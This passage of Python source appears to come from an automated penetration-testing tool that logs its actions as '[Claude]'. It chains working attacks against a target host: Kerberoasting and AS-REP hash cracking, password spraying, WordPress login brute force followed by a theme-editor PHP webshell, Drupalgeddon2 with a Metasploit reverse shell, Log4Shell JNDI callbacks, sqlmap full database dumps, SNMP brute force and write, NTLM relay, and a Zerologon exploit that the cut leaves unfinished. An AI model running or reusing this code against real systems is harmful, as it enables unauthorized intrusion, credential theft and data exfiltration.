            f"cat /tmp/kerb_{t_safe}.txt 2>/dev/null | head -20",
            target, timeout=40,
        )
        if "$krb5tgs$" in kerb_out:
            self._log(f"[Claude] AD-ATTACKS: tickets Kerberoast encontrados → crackeando!")
            # Save tickets to file
            with open(f"/tmp/kerb_hashes_{t_safe}.txt", "w") as f:
                for m in re.findall(r'\$krb5tgs\$\d+\$[^\s]+', kerb_out):
                    f.write(m + "\n")
            crack_out, _ = self._run_cmd(
                "kerb-crack",
                f"hashcat -a 0 -m 13100 --force --quiet "
                f"/tmp/kerb_hashes_{t_safe}.txt "
                f"/usr/share/wordlists/rockyou.txt "
                f"-r /usr/share/hashcat/rules/best64.rule 2>/dev/null | tail -10; "
                f"hashcat -m 13100 --show /tmp/kerb_hashes_{t_safe}.txt 2>/dev/null | head -10",
                target, timeout=300,
            )
            accumulated_output.append(f"=== Kerberoasting ===\n{kerb_out[:400]}\nCracked:\n{crack_out[:400]}")
            self._save_findings([{
                "title": f"AD: Kerberoasting → Tickets Crackeados @ {target}",
                "severity": "high",
                "description": f"Tickets Kerberos crackeados con rockyou:\n{crack_out[:300]}",
                "cve": "",
            }], target)

        # ── AS-REP Roasting — accounts with no pre-auth ───────────────────
        self._log(f"[Claude] AD-ATTACKS: AS-REP Roasting")
        asrep_out, _ = self._run_cmd(
            "asrep-roasting",
            f"impacket-GetNPUsers -dc-ip {target} -no-pass -usersfile /tmp/kerb_users_{t_safe}.txt "
            f"{target}/ 2>/dev/null | head -20; "
            f"crackmapexec ldap {target} {auth} --asreproast /tmp/asrep_{t_safe}.txt 2>/dev/null | head -10; "
            f"cat /tmp/asrep_{t_safe}.txt 2>/dev/null | head -10",
            target, timeout=40,
        )
        if "$krb5asrep$" in asrep_out:
            with open(f"/tmp/asrep_hashes_{t_safe}.txt", "w") as f:
                for m in re.findall(r'\$krb5asrep\$[^\s]+', asrep_out):
                    f.write(m + "\n")
            crack_out, _ = self._run_cmd(
                "asrep-crack",
                f"hashcat -a 0 -m 18200 --force --quiet "
                f"/tmp/asrep_hashes_{t_safe}.txt "
                f"/usr/share/wordlists/rockyou.txt 2>/dev/null | tail -10; "
                f"hashcat -m 18200 --show /tmp/asrep_hashes_{t_safe}.txt 2>/dev/null | head -10",
                target, timeout=300,
            )
            accumulated_output.append(f"=== AS-REP Roasting ===\n{asrep_out[:400]}\nCracked:\n{crack_out[:400]}")
            self._save_findings([{
                "title": f"AD: AS-REP Roasting → Contraseñas Obtenidas @ {target}",
                "severity": "critical",
                "description": f"Cuentas sin pre-autenticación Kerberos:\n{crack_out[:300]}",
                "cve": "",
            }], target)

        # ── Password spray ────────────────────────────────────────────────
        users_found = re.findall(r'(?:User:|username:)\s*(\w+)', enum_out, re.IGNORECASE)
        if users_found:
            self._log(f"[Claude] AD-ATTACKS: password spray {len(users_found)} usuarios")
            for spray_pass in ["Password1", "Welcome1", "Summer2024!", "Winter2024!", "P@ssword1"]:
                spray_out, _ = self._run_cmd(
                    f"ad-spray-{spray_pass[:6]}",
                    f"crackmapexec smb {target} -u {','.join(users_found[:15])} -p '{spray_pass}' "
                    f"--continue-on-success 2>/dev/null | grep '\\[+\\]' | head -5",
                    target, timeout=30,
                )
                if "[+]" in spray_out:
                    self._log(f"[Claude] AD-ATTACKS: spray exitoso con {spray_pass}!")
                    accumulated_output.append(f"=== AD Password Spray ===\n{spray_out[:400]}")
                    # Extract valid creds and pivot
                    valid = re.findall(r'\[\+\]\s+\S+\\(\w+):(\S+)', spray_out)
                    if valid:
                        self._windows_post_exploit(target, valid[0][0], valid[0][1], spray_out, accumulated_output)
                    break

    # ─────────────────────────────────────────────────────────────────────────
    # CMS exploitation (WordPress, Joomla, Drupal)
    # ─────────────────────────────────────────────────────────────────────────
    def _cms_exploit(self, target, open_ports, accumulated_output):
        """Auto-detect and exploit WordPress, Joomla, Drupal."""
        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443, 8888)]
        if not http_ports:
            return

        for port_num in http_ports[:3]:
            proto = "https" if port_num in (443, 8443) else "http"
            base = f"{proto}://{target}:{port_num}"

            # ── CMS detection ─────────────────────────────────────────────
            detect_out, _ = self._run_cmd(
                f"cms-detect-{port_num}",
                f"curl -s --max-time 10 -L '{base}/' 2>/dev/null | "
                f"grep -iEo 'wp-content|wp-includes|/joomla|com_content|/sites/default/files|drupal' | head -3; "
                f"curl -s --max-time 8 -I '{base}/wp-login.php' 2>/dev/null | grep '200\\|301'; "
                f"curl -s --max-time 8 -I '{base}/administrator/index.php' 2>/dev/null | grep '200\\|301'; "
                f"curl -s --max-time 8 -I '{base}/user/login' 2>/dev/null | grep '200\\|301'",
                target, timeout=20,
            )

            # ── WordPress ─────────────────────────────────────────────────
            if "wp-content" in detect_out.lower() or "wp-includes" in detect_out.lower():
                self._log(f"[Claude] CMS: WordPress detectado en {base}")
                # Enumerate users + brute force + plugin vulns
                wp_out, _ = self._run_cmd(
                    f"wpscan-{port_num}",
                    f"wpscan --url '{base}' --no-update --disable-tls-checks "
                    f"--enumerate u,vp,vt --plugins-detection aggressive "
                    f"--max-threads 5 2>/dev/null | head -80; "
                    f"# Extract users and try default/common passwords\n"
                    f"WP_USERS=$(wpscan --url '{base}' --no-update --enumerate u "
                    f"--format json 2>/dev/null | python3 -c "
                    f"\"import json,sys; d=json.load(sys.stdin); "
                    f"[print(u) for u in d.get('users',{{}}).keys()]\" 2>/dev/null | head -5); "
                    f"for u in $WP_USERS admin administrator; do "
                    f"  for p in admin password 123456 wordpress admin123 letmein; do "
                    f"    R=$(curl -s --max-time 8 -c /tmp/wp_cookie_{target.replace('.','_')}.txt "
                    f"    -X POST '{base}/wp-login.php' "
                    f"    -d \"log=$u&pwd=$p&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1\" "
                    f"    -b 'wordpress_test_cookie=WP+Cookie+check' 2>/dev/null | head -3); "
                    f"    echo \"$R\" | grep -qv 'login_error\\|Error' && echo \"WP_LOGIN_OK: $u:$p\" && break 2; "
                    f"  done; "
                    f"done",
                    target, timeout=120,
                )
                accumulated_output.append(f"=== WordPress {base} ===\n{wp_out[:1200]}")
                # Parse valid WP creds
                wp_creds = re.findall(r'WP_LOGIN_OK: (\w+):(\S+)', wp_out)
                for wp_u, wp_p in wp_creds[:2]:
                    self._log(f"[Claude] CMS: WordPress creds válidas {wp_u}:{wp_p} → intentando RCE!")
                    # Theme editor RCE (404.php)
                    rce_out, _ = self._run_cmd(
                        f"wp-rce-{wp_u}",
                        f"# Login and inject webshell via theme editor\n"
                        f"WP_NONCE=$(curl -s --max-time 10 "
                        f"-b /tmp/wp_cookie_{target.replace('.','_')}.txt "
                        f"'{base}/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone' 2>/dev/null | "
                        f"grep -oP 'nonce\":\"[^\"]+' | head -1 | cut -d'\"' -f3); "
                        f"curl -s --max-time 15 -X POST "
                        f"-b /tmp/wp_cookie_{target.replace('.','_')}.txt "
                        f"'{base}/wp-admin/theme-editor.php' "
                        f"-d \"nonce=$WP_NONCE&newcontent=<?php+system(\\$_GET['cmd']);+?>&action=edit-theme-plugin-file"
                        f"&file=404.php&theme=twentytwentyone&scrollTop=0\" 2>/dev/null | head -3; "
                        f"curl -s --max-time 10 '{base}/wp-content/themes/twentytwentyone/404.php?cmd=id' "
                        f"2>/dev/null | grep 'uid=' | head -2",
                        target, timeout=30,
                    )
                    self._capture_evidence(rce_out, target, f"wp-rce-{wp_u}", f"WP theme RCE {wp_u}")
                    if "uid=" in rce_out:
                        accumulated_output.append(f"=== WordPress RCE ({wp_u}) ===\n{rce_out[:400]}")
                        self._save_findings([{
                            "title": f"WordPress RCE via Theme Editor @ {base}",
                            "severity": "critical",
                            "description": f"Creds: {wp_u}:{wp_p} → webshell en 404.php → RCE.\n{rce_out[:200]}",
                            "cve": "",
                        }], target)
                # Save WP vulnerabilities as findings
                vuln_plugins = re.findall(r'\[!\]\s+(.+?CVE-\d{4}-\d+.+)', wp_out)
                for vuln in vuln_plugins[:5]:
                    self._save_findings([{
                        "title": f"WordPress Plugin Vuln @ {base}",
                        "severity": "high",
                        "description": vuln[:200],
                        "cve": re.search(r'CVE-\d{4}-\d+', vuln).group(0) if re.search(r'CVE-\d{4}-\d+', vuln) else "",
                    }], target)

            # ── Joomla ────────────────────────────────────────────────────
            elif "joomla" in detect_out.lower() or "com_content" in detect_out.lower():
                self._log(f"[Claude] CMS: Joomla detectado en {base}")
                joomla_out, _ = self._run_cmd(
                    f"joomla-scan-{port_num}",
                    f"droopescan scan joomla -u '{base}' 2>/dev/null | head -40; "
                    f"# Try default admin creds\n"
                    f"for u in admin administrator superuser; do "
                    f"  for p in admin password 123456 joomla admin123; do "
                    f"    TOKEN=$(curl -s --max-time 8 '{base}/administrator/index.php' 2>/dev/null | "
                    f"    grep -oP 'name=\"[a-f0-9]{{32}}\"' | head -1 | grep -oP '[a-f0-9]{{32}}'); "
                    f"    R=$(curl -s --max-time 10 "
                    f"    -X POST '{base}/administrator/index.php' "
                    f"    -d \"username=$u&passwd=$p&option=com_login&task=login&return=aW5kZXgucGhw&$TOKEN=1\" "
                    f"    2>/dev/null | grep -v 'Invalid\\|error' | head -3); "
                    f"    echo \"$R\" | grep -q 'cpanel\\|index.php?option=com_cpanel' && echo \"JOOMLA_OK: $u:$p\" && break 2; "
                    f"  done; "
                    f"done",
                    target, timeout=60,
                )
                accumulated_output.append(f"=== Joomla {base} ===\n{joomla_out[:800]}")

            # ── Drupal ────────────────────────────────────────────────────
            elif "drupal" in detect_out.lower() or "sites/default" in detect_out.lower():
                self._log(f"[Claude] CMS: Drupal detectado en {base}")
                drupal_out, _ = self._run_cmd(
                    f"drupal-scan-{port_num}",
                    f"droopescan scan drupal -u '{base}' 2>/dev/null | head -40; "
                    f"# Drupalgeddon2 CVE-2018-7600\n"
                    f"python3 -c \""
                    f"import urllib.request,urllib.parse\n"
                    f"url='{base}/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup'\n"
                    f"try:\n"
                    f"  r=urllib.request.urlopen(urllib.request.Request(url,b'form_id=user_pass&_triggering_element_name=name',method='POST'),timeout=10)\n"
                    f"  print(r.read(200))\n"
                    f"except Exception as e: print(e)\n"
                    f"\" 2>/dev/null | grep -E 'uid=|root|www-data'; "
                    f"# Drupalgeddon3 CVE-2018-7602\n"
                    f"msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; "
                    f"set RHOSTS {target}; set RPORT {port_num}; "
                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set PAYLOAD php/meterpreter/reverse_tcp; run; sleep 12; exit' 2>/dev/null | head -20",
                    target, timeout=60,
                )
                self._capture_evidence(drupal_out, target, f"drupal-exploit-{port_num}", "Drupalgeddon2/3")
                accumulated_output.append(f"=== Drupal {base} ===\n{drupal_out[:800]}")

    # ─────────────────────────────────────────────────────────────────────────
    # Web content fuzzing (feroxbuster / gobuster)
    # ─────────────────────────────────────────────────────────────────────────
    def _web_fuzz(self, target, open_ports, accumulated_output):
        """Fuzz web endpoints for hidden paths, backups, admin panels."""
        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443, 8888)]
        if not http_ports:
            return

        # Prefer feroxbuster, fall back to gobuster or dirb
        fuzz_tool = None
        for tool in ["feroxbuster", "gobuster", "dirb"]:
            check, _ = self._run_cmd(f"check-{tool}", f"which {tool} 2>/dev/null", target, timeout=5)
            if check.strip():
                fuzz_tool = tool
                break

        if not fuzz_tool:
            self._log(f"[Claude] WEB-FUZZ: ningún fuzzer disponible (feroxbuster/gobuster/dirb)")
            return

        wordlist_paths = [
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        ]
        wordlist = next((p for p in wordlist_paths if __import__('os').path.exists(p)), None)
        if not wordlist:
            self._log(f"[Claude] WEB-FUZZ: wordlist no encontrada")
            return

        for port_num in http_ports[:2]:
            proto = "https" if port_num in (443, 8443) else "http"
            base = f"{proto}://{target}:{port_num}"
            self._log(f"[Claude] WEB-FUZZ: {fuzz_tool} → {base}")

            if fuzz_tool == "feroxbuster":
                cmd = (
                    f"feroxbuster -u '{base}' -w {wordlist} -t 30 -d 2 "
                    f"--no-recursion --quiet --status-codes 200,301,302,403 "
                    f"--timeout 8 --output /tmp/ferox_{target.replace('.','_')}_{port_num}.txt "
                    f"2>/dev/null | grep -E '^[23][0-9]{{2}}' | head -40"
                )
            elif fuzz_tool == "gobuster":
                cmd = (
                    f"gobuster dir -u '{base}' -w {wordlist} -t 30 "
                    f"--no-tls-validation -q --timeout 8s "
                    f"-o /tmp/gobuster_{target.replace('.','_')}_{port_num}.txt "
                    f"2>/dev/null | head -40"
                )
            else:  # dirb
                cmd = (
                    f"dirb '{base}' {wordlist} -S -r -o "
                    f"/tmp/dirb_{target.replace('.','_')}_{port_num}.txt "
                    f"2>/dev/null | grep -E 'CODE:2|CODE:3' | head -40"
                )

            fuzz_out, _ = self._run_cmd(f"webfuzz-{port_num}", cmd, target, timeout=180)
            if fuzz_out.strip():
                accumulated_output.append(f"=== Web Fuzz {base} ===\n{fuzz_out[:1200]}")
                # Highlight interesting findings
                interesting = re.findall(
                    r'(?:200|301)\s+(https?://[^\s]+(?:admin|backup|upload|api|config|debug|test|shell|'
                    r'phpmyadmin|manager|console|dashboard|panel|login)[^\s]*)',
                    fuzz_out, re.IGNORECASE
                )
                for path in interesting[:5]:
                    self._save_findings([{
                        "title": f"Directorio/Archivo Interesante: {path.split('/')[-1]} @ {base}",
                        "severity": "medium",
                        "description": f"Ruta descubierta por fuzzing: {path}",
                        "cve": "",
                    }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Log4Shell CVE-2021-44228 scanner
    # ─────────────────────────────────────────────────────────────────────────
    def _log4shell_scan(self, target, open_ports, accumulated_output):
        """Test for Log4Shell CVE-2021-44228 via JNDI injection in HTTP headers."""
        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443, 8888, 9200)]
        # Also check Java-specific ports
        java_ports = [p["port"] for p in open_ports if any(j in p["service"].lower() + p["version"].lower()
                      for j in ["java", "tomcat", "jboss", "wildfly", "spring", "jetty", "log4j"])]
        target_ports = list(dict.fromkeys(http_ports + java_ports))[:4]
        if not target_ports:
            return

        self._log(f"[Claude] LOG4SHELL: probando CVE-2021-44228 en {len(target_ports)} puertos")

        # Start a quick HTTP listener to catch callbacks
        cb_port = self.lport + 10
        cb_out, _ = self._run_cmd(
            "log4shell-listener",
            f"timeout 30 nc -lvnp {cb_port} 2>/dev/null &"
            f"echo CB_LISTENER_PID=$!",
            target, timeout=5,
        )

        for port_num in target_ports:
            proto = "https" if port_num in (443, 8443) else "http"
            base = f"{proto}://{target}:{port_num}"
            # Discover endpoints first
            endpoints, _ = self._run_cmd(
                f"log4shell-endpoints-{port_num}",
                f"curl -s --max-time 8 -o /dev/null -w '%{{url_effective}}' -L '{base}/' 2>/dev/null; "
                f"echo; "
                f"curl -s --max-time 8 '{base}/' 2>/dev/null | grep -oP 'action=\"[^\"]+\"' | head -5 | "
                f"cut -d'\"' -f2 | head -3",
                target, timeout=12,
            )
            test_urls = [base + "/"] + [base + e if e.startswith("/") else e
                                         for e in re.findall(r'https?://\S+|/\S+', endpoints)][:3]
            # JNDI payload targeting our callback server
            payload = f"${{jndi:ldap://{self.lhost}:{cb_port}/log4shell}}"
            payload_dns = f"${{jndi:dns://{self.lhost}:{cb_port}/log4shell}}"

            for test_url in test_urls[:3]:
                l4_out, _ = self._run_cmd(
                    f"log4shell-{port_num}-{hash(test_url) % 9999}",
                    f"curl -s --max-time 10 '{test_url}' "
                    f"-H 'User-Agent: {payload}' "
                    f"-H 'X-Forwarded-For: {payload}' "
                    f"-H 'X-Api-Version: {payload}' "
                    f"-H 'Referer: {payload}' "
                    f"-H 'X-Forwarded-Host: {payload}' "
                    f"2>/dev/null | head -3; "
                    # Also POST to login forms
                    f"curl -s --max-time 10 '{test_url}' "
                    f"-X POST "
                    f"-d 'username={payload}&password=log4shell' "
                    f"-H 'Content-Type: application/x-www-form-urlencoded' "
                    f"2>/dev/null | head -3",
                    target, timeout=15,
                )
                # Check if our callback listener received a connection
                cb_check, _ = self._run_cmd(
                    f"log4shell-cb-check-{port_num}",
                    f"ls -la /proc/$(cat /tmp/log4shell_cb_pid 2>/dev/null)/fd 2>/dev/null | "
                    f"grep 'socket' | wc -l; "
                    f"# Direct check via ss\n"
                    f"ss -tnp 2>/dev/null | grep ':{cb_port}' | grep -v LISTEN | head -3",
                    target, timeout=5,
                )
                if cb_check.strip() and any(c.isdigit() and int(c) > 0 for c in cb_check.split()):
                    self._log(f"[Claude] LOG4SHELL: CALLBACK RECIBIDO de {target}:{port_num}!")
                    self._save_findings([{
                        "title": f"Log4Shell CVE-2021-44228 CONFIRMADO @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"JNDI callback recibido → Log4j vulnerable.\nURL: {test_url}\n"
                                       f"Payload inyectado en headers HTTP.",
                        "cve": "CVE-2021-44228",
                    }], target)
                    accumulated_output.append(f"=== LOG4SHELL CONFIRMED {base} ===\ncallback recibido")
                    break

    # ─────────────────────────────────────────────────────────────────────────
    # SQLmap automatic exploitation
    # ─────────────────────────────────────────────────────────────────────────
    def _sqlmap_auto(self, target, open_ports, accumulated_output):
        """Auto-run sqlmap on discovered HTTP endpoints and forms."""
        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443, 8888)]
        if not http_ports:
            return

        sqlmap_available, _ = self._run_cmd("check-sqlmap", "which sqlmap 2>/dev/null", target, timeout=5)
        if not sqlmap_available.strip():
            return

        self._log(f"[Claude] SQLMAP: escaneando endpoints HTTP en {len(http_ports)} puertos")
        t_safe = target.replace(".", "_")

        for port_num in http_ports[:2]:
            proto = "https" if port_num in (443, 8443) else "http"
            base = f"{proto}://{target}:{port_num}"

            # ── Crawl for forms and URL params ────────────────────────────
            crawl_out, _ = self._run_cmd(
                f"sqlmap-crawl-{port_num}",
                f"curl -s --max-time 15 -L '{base}/' 2>/dev/null | "
                f"grep -oP '(?:action|href)=\"[^\"]*\\?[^\"]+\"' | "
                f"grep -oP '\"[^\"]*\\?[^\"]+\"' | tr -d '\"' | "
                f"sed 's|^|{base}|g' | head -10; "
                # Also check common injectable params
                f"echo '{base}/?id=1'; echo '{base}/?search=test'; echo '{base}/?page=1'",
                target, timeout=15,
            )
            urls_to_test = list(dict.fromkeys(
                re.findall(r'https?://[^\s"<>]+\?[^\s"<>]+', crawl_out)
            ))[:5]
            if not urls_to_test:
                urls_to_test = [f"{base}/?id=1", f"{base}/?page=1"]

            for test_url in urls_to_test[:3]:
                self._log(f"[Claude] SQLMAP: probando → {test_url[:60]}")
                sql_out, _ = self._run_cmd(
                    f"sqlmap-{port_num}-{hash(test_url) % 9999}",
                    f"sqlmap -u '{test_url}' --batch --level=2 --risk=2 "
                    f"--timeout=10 --retries=1 --threads=3 "
                    f"--technique=BEUSTQ "
                    f"--output-dir=/tmp/sqlmap_{t_safe}_{port_num}/ "
                    f"--forms --crawl=2 "
                    f"2>/dev/null | grep -E 'injectable|payload:|parameter|database|dump|DBMS' | head -30",
                    target, timeout=180,
                )
                if "injectable" in sql_out.lower() or "payload:" in sql_out.lower():
                    self._log(f"[Claude] SQLMAP: SQLi encontrada → volcando DB!")
                    dump_out, _ = self._run_cmd(
                        f"sqlmap-dump-{port_num}",
                        f"sqlmap -u '{test_url}' --batch --level=2 --risk=2 "
                        f"--timeout=10 --threads=3 "
                        f"--output-dir=/tmp/sqlmap_{t_safe}_{port_num}/ "
                        f"--dbs --dump-all --exclude-sysdbs "
                        f"--where 'username IS NOT NULL OR user IS NOT NULL OR email IS NOT NULL' "
                        f"--stop-on-first 2>/dev/null | "
                        f"grep -E 'available databases|Table:|Column:|Entry:|password|passwd|hash' | head -40",
                        target, timeout=240,
                    )
                    accumulated_output.append(f"=== SQLmap {test_url} ===\n{sql_out[:600]}\n{dump_out[:600]}")
                    self._auto_crack_hashes(dump_out, target, accumulated_output)
                    self._save_findings([{
                        "title": f"SQL Injection + DB Dump @ {test_url[:60]}",
                        "severity": "critical",
                        "description": f"SQLmap confirmó inyección SQL:\n{sql_out[:300]}\n\nDump:\n{dump_out[:300]}",
                        "cve": "",
                    }], target)
                elif sql_out.strip():
                    accumulated_output.append(f"=== SQLmap {test_url[:50]} ===\n{sql_out[:400]}")

    # ─────────────────────────────────────────────────────────────────────────
    # Tier 1-1: UDP scan + SNMP community string sweep
    # ─────────────────────────────────────────────────────────────────────────
    def _udp_snmp_scan(self, target, accumulated_output):
        """UDP top-20 + SNMP community brute (public/private/internal/community)."""
        self._log(f"[Claude] UDP-SCAN: escaneando top UDP ports + SNMP @ {target}")
        # UDP top ports
        udp_out, _ = self._run_cmd(
            "nmap-udp",
            f"nmap -sU --open -T4 --top-ports 20 --version-intensity 0 "
            f"--max-retries 1 {target} 2>/dev/null",
            target, timeout=120,
        )
        if udp_out.strip():
            accumulated_output.append(f"=== UDP Scan ===\n{udp_out[:800]}")
            # Parse open UDP ports and save them
            udp_findings = _parse_tool_output("nmap", udp_out, target, "nmap-udp")
            if udp_findings.get("findings"):
                self._save_findings(udp_findings["findings"], target)

        # SNMP brute force
        communities = ["public", "private", "internal", "community", "manager", "snmpd", "cisco", "default"]
        for comm in communities:
            snmp_out, _ = self._run_cmd(
                f"snmp-{comm}",
                f"snmpwalk -v2c -c {comm} -t 3 -r 1 {target} 2>/dev/null | head -30; "
                f"snmpwalk -v1  -c {comm} -t 3 -r 1 {target} 2>/dev/null | head -10",
                target, timeout=15,
            )
            if snmp_out.strip() and "Timeout" not in snmp_out and "No Such" not in snmp_out:
                self._log(f"[Claude] SNMP: community '{comm}' válida en {target}!")
                # Full MIB walk
                full_out, _ = self._run_cmd(
                    f"snmp-full-{comm}",
                    f"snmpwalk -v2c -c {comm} -t 5 {target} 2>/dev/null | head -100; "
                    f"# Specific OIDs: system, processes, network, users\n"
                    f"snmpget -v2c -c {comm} {target} sysDescr.0 sysName.0 sysLocation.0 2>/dev/null; "
                    f"snmpwalk -v2c -c {comm} {target} hrSWRunName 2>/dev/null | head -20; "
                    f"snmpwalk -v2c -c {comm} {target} ifDescr 2>/dev/null | head -10; "
                    f"snmpwalk -v2c -c {comm} {target} ipAdEntAddr 2>/dev/null | head -10",
                    target, timeout=40,
                )
                accumulated_output.append(f"=== SNMP community='{comm}' ===\n{full_out[:1200]}")
                # Look for credentials, passwords, config data in SNMP output
                creds_in_snmp = re.findall(
                    r'(?:password|passwd|pwd|secret|key|credential)[^\n]{0,50}([a-zA-Z0-9!@#$%^&*]{6,30})',
                    full_out, re.IGNORECASE
                )
                self._save_findings([{
                    "title": f"SNMP Community String '{comm}' Válida @ {target}",
                    "severity": "medium",
                    "description": f"SNMP accesible con community '{comm}'. "
                                   f"Información expuesta:\n{full_out[:400]}",
                    "cve": "",
                }], target)
                # Try SNMP write for community 'private' (change default gateway / add route)
                if comm == "private":
                    self._run_cmd(
                        "snmp-write-test",
                        f"snmpset -v2c -c {comm} {target} sysLocation.0 s 'PWNED_BY_PENTEST' 2>/dev/null && "
                        f"echo 'SNMP_WRITE_CONFIRMED' || echo 'snmp_readonly'",
                        target, timeout=10,
                    )
                break  # Found valid community, no need to continue

        # DNS zone transfer (here since UDP scan revealed port 53)
        if "53/udp" in udp_out or "domain" in udp_out.lower():
            self._log(f"[Claude] DNS: intentando zone transfer @ {target}")
            dns_out, _ = self._run_cmd(
                "dns-zone-transfer",
                f"dig axfr @{target} {target} 2>/dev/null | head -40; "
                f"# Try to find domain name first\n"
                f"DOMAIN=$(nslookup {target} {target} 2>/dev/null | grep -oP 'name = \\K[^.]+\\.[a-z]+'); "
                f"[ -n \"$DOMAIN\" ] && dig axfr @{target} $DOMAIN 2>/dev/null | head -40",
                target, timeout=20,
            )
            if "Transfer failed" not in dns_out and dns_out.strip():
                accumulated_output.append(f"=== DNS Zone Transfer ===\n{dns_out[:800]}")
                self._save_findings([{
                    "title": f"DNS Zone Transfer Posible @ {target}",
                    "severity": "medium",
                    "description": f"Servidor DNS permite AXFR:\n{dns_out[:400]}",
                    "cve": "",
                }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Tier 1-2: NTLM Relay attack (Responder + ntlmrelayx)
    # ─────────────────────────────────────────────────────────────────────────
    def _ntlm_relay_attack(self, target, open_ports, accumulated_output):
        """Run Responder in analyze mode + ntlmrelayx targeting found SMB hosts."""
        port_set = {p["port"] for p in open_ports}
        if 445 not in port_set and 139 not in port_set:
            return
        self._log(f"[Claude] NTLM-RELAY: configurando ntlmrelayx + Responder → {target}")

        t_safe = target.replace(".", "_")
        # Check SMB signing
        sign_out, _ = self._run_cmd(
            "smb-signing-check",
            f"crackmapexec smb {target} 2>/dev/null | grep -i 'signing' | head -3; "
            f"nmap -p 445 --script smb-security-mode {target} 2>/dev/null | "
            f"grep -i 'message_signing\\|signing' | head -3",
            target, timeout=20,
        )
        signing_disabled = (
            "signing:false" in sign_out.lower() or
            "message signing disabled" in sign_out.lower() or
            "not required" in sign_out.lower()
        )
        if not signing_disabled:
            self._log(f"[Claude] NTLM-RELAY: SMB signing habilitado en {target} — relay no aplicable")
            return

        self._log(f"[Claude] NTLM-RELAY: SMB signing DESHABILITADO → lanzando ntlmrelayx!")
        # Run ntlmrelayx targeting the host without SMB signing
        relay_out, _ = self._run_cmd(
            "ntlmrelayx",
            f"# Start ntlmrelayx to relay against target\n"
            f"timeout 60 impacket-ntlmrelayx -t smb://{target} -smb2support --no-http-server "
            f"-of /tmp/ntlm_hashes_{t_safe}.txt 2>/dev/null &\n"
            f"RELAY_PID=$!\n"
            f"# Trigger authentication via various methods\n"
            f"# 1. Try to coerce auth via PetitPotam (if target is Windows)\n"
            f"timeout 20 python3 -c \""
            f"import subprocess\n"
            f"r=subprocess.run(['impacket-ntlmrelayx','-t','smb://{target}','-smb2support','--no-http-server','-of','/tmp/ntlm_hashes_{t_safe}.txt'],capture_output=True,text=True,timeout=10)\n"
            f"print(r.stdout[:200])\n"
            f"\" 2>/dev/null; "
            f"# Wait for hashes\n"
            f"sleep 30; "
            f"kill $RELAY_PID 2>/dev/null; "
            f"cat /tmp/ntlm_hashes_{t_safe}.txt 2>/dev/null | head -20; "
            f"# Also check for SAM dump if relay succeeded\n"
            f"ls /tmp/smb_relay_* /tmp/*LUCRECIA* 2>/dev/null | head -5",
            target, timeout=90,
        )
        if relay_out.strip():
            accumulated_output.append(f"=== NTLM Relay ===\n{relay_out[:600]}")
            self._auto_crack_hashes(relay_out, target, accumulated_output)

        # Also check for Responder captured hashes (if Responder ran elsewhere)
        resp_hashes, _ = self._run_cmd(
            "responder-hashes",
            f"find /usr/share/responder/logs /tmp -name '*.txt' -newer /tmp 2>/dev/null | "
            f"xargs grep -l 'NTLMv\\|NTLM' 2>/dev/null | head -3 | "
            f"xargs cat 2>/dev/null | head -20",
            target, timeout=10,
        )
        if "NTLMv" in resp_hashes or "NTLM" in resp_hashes:
            self._auto_crack_hashes(resp_hashes, target, accumulated_output)
            accumulated_output.append(f"=== Responder Hashes ===\n{resp_hashes[:400]}")

    # ─────────────────────────────────────────────────────────────────────────
    # Tier 1-5: Zerologon CVE-2020-1472
    # ─────────────────────────────────────────────────────────────────────────
    def _zerologon_attack(self, target, open_ports, accumulated_output):
        """CVE-2020-1472: reset DC machine account password to empty → Domain Admin."""
        port_set = {p["port"] for p in open_ports}
        # Only try if this looks like a DC (port 88 Kerberos or LDAP 389/636)
        if not (88 in port_set or 389 in port_set or 636 in port_set):
            return
        self._log(f"[Claude] ZEROLOGON: CVE-2020-1472 → {target}")

        # Find DC name
        dc_name_out, _ = self._run_cmd(
            "zerologon-dc-name",
            f"nmap -p 135,445 --script smb-os-discovery {target} 2>/dev/null | "
            f"grep -iE 'Computer name|Domain|NetBIOS' | head -5; "
            f"nmblookup -A {target} 2>/dev/null | head -10; "
            f"crackmapexec smb {target} 2>/dev/null | grep -oP '(?<=name:)[^\\s\\)]+' | head -1",
            target, timeout=20,
        )
        dc_name_match = re.search(r'(?:name:|Computer name:|<00>)\s*(\w[\w-]+)', dc_name_out, re.IGNORECASE)
        dc_name = dc_name_match.group(1) if dc_name_match else "DC"

        zero_out, _ = self._run_cmd(
            "zerologon-check",
            f"# Check vulnerability first\n"
            f"python3 -c \""
            f"import subprocess\n"
            f"r=subprocess.run(['impacket-secretsdump','-no-pass','-just-dc',f'{dc_name}$@{target}'],"
            f"capture_output=True,text=True,timeout=15)\n"
            f"print('ZL_ALREADY_VULNERABLE' if 'password' in r.stdout.lower() else 'ZL_need_exploit')\n"
            f"\" 2>/dev/null; "
            f"# Try zerologon exploit directly\n"
            f"python3 - << 'ZLEOF'\n"
            f"try:\n"
            f"    from impacket.dcerpc.v5 import nrpc, epm, transport\n"
            f"    from impacket.dcerpc.v5.dtypes import NULL\n"
            f"    import struct, sys\n"
            f"    binding = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:{target}[135]')\n"
            f"    dce = binding.get_dce_rpc()\n"
            f"    dce.connect()\n"
            f"    dce.bind(nrpc.MSRPC_UUID_NRPC)\n"
            f"    for _ in range(2000):\n"
            f"        try:\n"
            f"            req = nrpc.NetrServerAuthenticate3()\n"
            f"            req['PrimaryName'] = NULL\n"
            f"            req['AccountName'] = f'{dc_name}$\\x00'\n"
